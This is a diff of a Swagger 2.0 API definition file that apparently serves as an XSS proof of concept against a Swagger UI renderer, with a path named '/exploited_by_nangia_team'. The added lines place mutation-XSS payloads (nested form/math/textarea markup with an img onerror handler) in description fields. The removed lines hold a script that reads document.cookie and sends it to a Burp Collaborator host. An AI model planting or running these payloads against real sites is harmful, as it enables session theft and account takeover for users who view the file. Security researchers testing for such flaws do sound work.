@@ -1,23 +1,10 @@
+---
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('Domain: ' + document.domain) src=1>
-    <script>
-      // Display the current domain in an alert
-      alert("Domain: " + document.domain);
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
 
-      // Fetch the cookies
-      var cookies = document.cookie;
-
-      // Display the cookies in an alert
-      alert("Cookies: " + cookies);
-
-      // Send the cookies to your Burp Collaborator URL
-      var burpCollaboratorURL = "https://2adm43ns1u8ujq1q9nipcc8lhcn3b0zp.oastify.com"; // Replace with your actual Burp Collaborator URL
-      var img = new Image();
-      img.src = burpCollaboratorURL + "/?cookie=" + encodeURIComponent(cookies);
-    </script>
   version: production
 basePath: https://target.com
 produces:
@@ -35,14 +22,15 @@ paths:
         '200':
           description: No response was specified
       tags:
-      - Mathis Pais De Sousa
+      - Hackersss
       operationId: findAccounts
       summary: this is example text
   "/exploited_by_nangia_team":
     delete:
       parameters:
       - description: |
-          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1></form>
+          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
+
         format: int64
         in: path
         name: id
